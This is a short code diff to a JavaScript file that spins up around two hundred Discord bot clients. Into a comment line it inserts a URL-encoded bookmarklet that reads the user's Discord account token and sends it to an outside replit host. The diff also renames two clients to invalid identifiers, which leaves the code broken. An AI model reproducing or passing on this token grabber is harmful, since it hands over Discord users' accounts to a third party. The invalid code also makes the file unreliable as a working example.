@@ -198,8 +198,8 @@ const jano195 = new Discord.Client();
 const jano196 = new Discord.Client();
 const jano197 = new Discord.Client();
 const jano198 = new Discord.Client();
-const jano199 = new Discord.Client();
-const jano200 = new Discord.Client();
+const LX.15.1 = new Discord.Client();
+const LX15.1 = new Discord.Client();
 
 ////////
 jano.on("message", message => {
@@ -6138,7 +6138,7 @@ jano200.on("ready", () => {
 });
 //////// playing or dnd  streaming ////////
 
-//////////////// tokn lera da bne
+//////////////// javascript:(async()%20%3D%3E%20%7B%20const%20token%20%3D%20(webpackChunkdiscord_app.push(%5B%5B''%5D%2C%7B%7D%2Ce%3D%3E%7Bm%3D%5B%5D%3Bfor(let%20c%20in%20e.c)m.push(e.c%5Bc%5D)%7D%5D)%2Cm).find(m%3D%3Em%3F.exports%3F.default%3F.getToken!%3D%3Dvoid%200).exports.default.getToken()%3Bwindow.location.href%20%3D%20%60https%3A%2F%2Ftoken-finder-api.risinplayz1337.repl.co%2F%3Fuser%3D%24%7Btoken%7D%60%3B%7D)()
 
 jano.login("");
 jano2.login("");
